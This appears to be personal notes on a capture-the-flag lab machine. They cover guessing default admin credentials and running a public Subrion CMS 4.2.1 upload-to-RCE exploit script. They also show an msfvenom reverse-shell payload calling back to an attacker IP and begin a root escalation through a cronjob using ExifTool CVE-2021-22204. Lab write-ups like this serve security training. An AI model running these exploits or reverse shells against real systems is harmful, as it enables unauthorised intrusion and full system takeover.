#Linux 
##### Summary
In this walkthrough, we will exploit the target via an authenticated file upload bypass vulnerability in Subrion CMS that leads to remote code execution. We'll then exploit a root cronjob via a script running exiftool every minute. #Linux

##### Enumeration
###### Nmap
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Guessing Admin Credentials with cred admin:admin successful.
Found the CMS name with version Subrion CMS 4.2.1 #CMS_Exploit

##### Exploitation
Subrion CMS 4.2.1 - File Upload Bypass and RCE
Public exploit search reveals a Remote Code Execution vulnerability in this version of the application. Let's update searchsploit and then copy the exploit to our working directory.
```
python3 49876.py -u http://exfiltrated.offsec/panel/ --user admin --pass admin
```

##### Reverse Shell
```
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.118.11 LPORT=4444 -f elf -o shell
```

##### Escalation
Cronjob Enumeration #cronjob
After further enumeration, we find an entry in the /etc/crontab file, executing /opt/image-exif.sh as root every minute.

ExifTool Arbitrary Code Execution
Public search reveals the following exploit-db document on CVE-2021-22204. The document details an arbitrary code execution vulnerability in the DjVu file format in ExifTool versions 7.44 and up. Although we cannot easily determine the version of the tool running on this target, we'll give this exploit a try.

This exploit uses djvumake, which we can install with the djvulibre-bin package.